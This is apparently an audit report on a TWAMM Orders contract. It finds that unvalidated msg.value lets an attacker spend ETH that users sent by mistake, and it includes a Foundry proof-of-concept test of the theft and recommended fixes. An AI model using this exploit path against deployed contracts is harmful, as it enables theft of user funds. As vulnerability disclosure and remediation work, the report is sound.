## Title
Native Token Accounting Error: Unvalidated msg.value Allows Theft of Accidentally Sent ETH in Orders Contract

## Summary
The Orders.sol contract fails to validate msg.value when creating or increasing TWAMM orders, allowing ETH to accumulate in the contract when users mistakenly send it with ERC20 token orders. Attackers can then steal this ETH by creating native token orders without sending any ETH themselves, as the contract uses its own balance instead of requiring payment from the caller.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/Orders.sol` (function `handleLockData`, lines 144-158)

**Intended Logic:** When users create or increase TWAMM orders, the contract should accept ETH payment only for native token orders and reject or refund ETH sent with ERC20 token orders.

**Actual Logic:** The contract blindly accepts any msg.value sent to the payable `increaseSellAmount` and `mintAndIncreaseSellAmount` functions. When processing the order:
- For native token orders (sellToken == NATIVE_TOKEN_ADDRESS): Transfers `amount` from the Orders contract's ETH balance to ACCOUNTANT
- For ERC20 token orders: Pulls tokens via ACCOUNTANT.payFrom, but leaves any msg.value in the Orders contract

There is no validation that msg.value matches the required amount for native orders, or that msg.value is zero for ERC20 orders. [1](#0-0) 

**Exploitation Path:**
1. **Victim's Mistake**: Alice wants to create a USDC order and mistakenly sends 10 ETH with the transaction (confusing WETH with ETH, or thinking ETH is required)
2. **ETH Accumulation**: The order processes successfully via ACCOUNTANT.payFrom (line 150), but the 10 ETH remains in the Orders contract balance
3. **Attacker Detection**: Bob monitors the Orders contract and sees it now has a 10 ETH balance
4. **Theft Execution**: Bob calls `increaseSellAmount` for a native ETH order (sellToken = address(0)) for 10 ETH, but sends 0 msg.value
5. **Successful Theft**: Line 148 executes `SafeTransferLib.safeTransferETH(address(ACCOUNTANT), 10 ETH)`, which succeeds using Alice's trapped ETH. Bob gets a 10 ETH order funded by Alice's mistake.

**Security Property Broken:** Violates the Solvency invariant - users cannot recover their accidentally sent funds before attackers steal them. Also violates user fund safety as direct theft of user assets occurs.

## Impact Explanation
- **Affected Assets**: Native ETH sent by any user to Orders contract functions
- **Damage Severity**: Complete loss of mistakenly sent ETH. Attacker can drain 100% of accumulated ETH in the contract by front-running before victims can call `refundNativeToken()`
- **User Impact**: Any user who sends ETH with ERC20 orders loses those funds. Given that wrapped vs native token confusion is common (WETH vs ETH), this affects a realistic user base. The attack is repeatable for every mistake.

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged user can exploit this. Attackers can run MEV bots to monitor Orders contract balance and immediately steal accumulated ETH
- **Preconditions**: Only requires that the Orders contract has ETH balance from previous users' mistakes
- **Execution Complexity**: Single transaction. Attacker simply calls `increaseSellAmount` with native token order and 0 msg.value
- **Frequency**: Exploitable continuously. Each time a user sends ETH with an ERC20 order, attackers can steal it before the victim realizes and calls `refundNativeToken()`

## Recommendation

Add msg.value validation in the `handleLockData` function: [1](#0-0) 

The fix should:
1. For native token orders (saleRateDelta > 0): Require msg.value matches the amount needed, then use msg.value instead of contract balance
2. For ERC20 token orders: Require msg.value == 0 to prevent accidental ETH loss
3. Refund any excess msg.value immediately

Reference the correct pattern implemented in Router.sol: [2](#0-1) 

Alternative mitigation: Implement a receive() function that reverts, forcing all ETH to come through the lock mechanism where it can be properly tracked and refunded.

## Proof of Concept

```solidity
// File: test/Exploit_NativeTokenTheft.t.sol
// Run with: forge test --match-test test_NativeTokenTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import {Orders} from "../src/Orders.sol";
import {OrderKey} from "../src/types/orderKey.sol";
import {createOrderConfig} from "../src/types/orderConfig.sol";
import {NATIVE_TOKEN_ADDRESS} from "../src/math/constants.sol";
import {BaseOrdersTest} from "./Orders.t.sol";

contract Exploit_NativeTokenTheft is BaseOrdersTest {
    address victim = address(0x1);
    address attacker = address(0x2);
    
    function setUp() public override {
        BaseOrdersTest.setUp();
        vm.deal(victim, 100 ether);
        vm.deal(attacker, 1 ether);
    }
    
    function test_NativeTokenTheft() public {
        // Setup: Create a TWAMM pool with token0 (ERC20) and token1 (ERC20)
        uint64 fee = uint64((uint256(5) << 64) / 100);
        PoolKey memory poolKey = createTwammPool({fee: fee, tick: 0});
        createPosition(poolKey, MIN_TICK, MAX_TICK, 10000, 10000);
        
        // VICTIM'S MISTAKE: Alice creates ERC20 order but sends 10 ETH by mistake
        vm.startPrank(victim);
        token0.approve(address(orders), type(uint256).max);
        
        uint64 startTime = alignToNextValidTime();
        uint64 endTime = uint64(nextValidTime(block.timestamp, startTime));
        
        OrderKey memory erc20Key = OrderKey({
            token0: poolKey.token0,
            token1: poolKey.token1,
            config: createOrderConfig({_fee: fee, _isToken1: false, _startTime: startTime, _endTime: endTime})
        });
        
        // Victim sends 10 ETH with ERC20 order (mistake)
        uint256 victimBalanceBefore = victim.balance;
        orders.mintAndIncreaseSellAmount{value: 10 ether}(erc20Key, 100, type(uint112).max);
        uint256 victimBalanceAfter = victim.balance;
        
        // Verify victim lost 10 ETH (trapped in Orders contract)
        assertEq(victimBalanceBefore - victimBalanceAfter, 10 ether, "Victim lost 10 ETH");
        assertEq(address(orders).balance, 10 ether, "ETH stuck in Orders contract");
        vm.stopPrank();
        
        // ATTACKER EXPLOITS: Bob creates native ETH order WITHOUT sending ETH
        vm.startPrank(attacker);
        
        // Create native token order (token0 = address(0))
        OrderKey memory nativeKey = OrderKey({
            token0: NATIVE_TOKEN_ADDRESS,
            token1: poolKey.token1,
            config: createOrderConfig({_fee: fee, _isToken1: false, _startTime: startTime, _endTime: endTime})
        });
        
        // Attacker creates pool with native token
        PoolKey memory nativePoolKey = createPool(
            NATIVE_TOKEN_ADDRESS,
            address(token1),
            0,
            createFullRangePoolConfig(fee, address(twamm))
        );
        
        // Fund the pool
        token1.approve(address(positions), type(uint256).max);
        positions.mint{value: 10000}(
            nativePoolKey,
            MIN_TICK,
            MAX_TICK,
            10000,
            10000,
            0,
            0,
            attacker
        );
        
        uint256 attackerBalanceBefore = attacker.balance;
        
        // Attacker creates 10 ETH order WITHOUT sending any ETH (sends 0 value)
        (uint256 id, ) = orders.mintAndIncreaseSellAmount{value: 0}(
            OrderKey({
                token0: NATIVE_TOKEN_ADDRESS,
                token1: address(token1),
                config: createOrderConfig({_fee: fee, _isToken1: false, _startTime: startTime, _endTime: endTime})
            }),
            uint112(10 ether),
            type(uint112).max
        );
        
        uint256 attackerBalanceAfter = attacker.balance;
        
        // VERIFY EXPLOIT SUCCESS
        assertEq(attackerBalanceBefore - attackerBalanceAfter, 0, "Attacker spent 0 ETH");
        assertEq(address(orders).balance, 0, "Orders contract drained");
        assertEq(id > 0, true, "Attacker got a valid order ID");
        
        vm.stopPrank();
        
        console.log("EXPLOIT SUCCESSFUL:");
        console.log("- Victim lost: 10 ETH (trapped in Orders)");
        console.log("- Attacker spent: 0 ETH");
        console.log("- Attacker received: 10 ETH order funded by victim's ETH");
    }
}
```

**Notes:**

The vulnerability stems from Orders.sol treating msg.value as a passive balance accumulator rather than validating it against the order requirements. The contract inherits `PayableMulticallable` which provides a `refundNativeToken()` function [3](#0-2) , but this requires victims to manually call it before attackers can steal the funds - an unrealistic defense given MEV bot capabilities.

The correct implementation pattern is demonstrated in RevenueBuybacks.sol, which conditionally sends ETH only when dealing with native tokens: [4](#0-3) 

This issue is distinct from the Router's handling because Orders.sol uses `SafeTransferLib.safeTransferETH` from the contract's balance rather than properly accounting for msg.value sent by the caller.

### Citations

**File:** src/Orders.sol (L144-158)
```text
            if (amount != 0) {
                address sellToken = orderKey.sellToken();
                if (saleRateDelta > 0) {
                    if (sellToken == NATIVE_TOKEN_ADDRESS) {
                        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint256(amount));
                    } else {
                        ACCOUNTANT.payFrom(recipientOrPayer, sellToken, uint256(amount));
                    }
                } else {
                    unchecked {
                        // we know amount will never exceed the uint128 type because of limitations on sale rate (fixed point 80.32) and duration (uint32)
                        ACCOUNTANT.withdraw(sellToken, recipientOrPayer, uint128(uint256(-amount)));
                    }
                }
            }
```

**File:** src/Router.sol (L135-142)
```text
                            int256 valueDifference = int256(value) - int256(balanceUpdate.delta0());

                            // refund the overpaid ETH to the swapper
                            if (valueDifference > 0) {
                                ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, swapper, uint128(uint256(valueDifference)));
                            } else if (valueDifference < 0) {
                                SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-valueDifference)));
                            }
```

**File:** src/base/PayableMulticallable.sol (L25-29)
```text
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```

**File:** src/RevenueBuybacks.sol (L134-136)
```text
                saleRate = ORDERS.increaseSellAmount{value: isEth ? amountToSpend : 0}(
                    NFT_ID, _createOrderKey(token, state.fee(), 0, endTime), uint128(amountToSpend), type(uint112).max
                );
```
